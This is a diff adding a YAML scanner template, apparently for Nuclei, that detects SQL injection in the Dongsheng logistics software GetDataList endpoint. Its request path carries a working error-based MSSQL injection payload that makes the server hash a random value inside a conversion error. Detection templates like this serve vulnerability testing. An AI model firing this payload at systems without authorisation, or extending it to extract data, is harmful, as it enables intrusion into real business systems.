@@ -1,0 +1,30 @@
+id: poc-yaml-dongshengsoft-getdatalist-sqli
+info:
+  name: 东胜物流软件 GetDataList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the Dongsheng logistics software GetDataList endpoint.
+
+variables:
+  t1: "{{rand_int(1,100000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(32)%2b(select+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27)))%2bCHAR(32)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))--%20&page=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
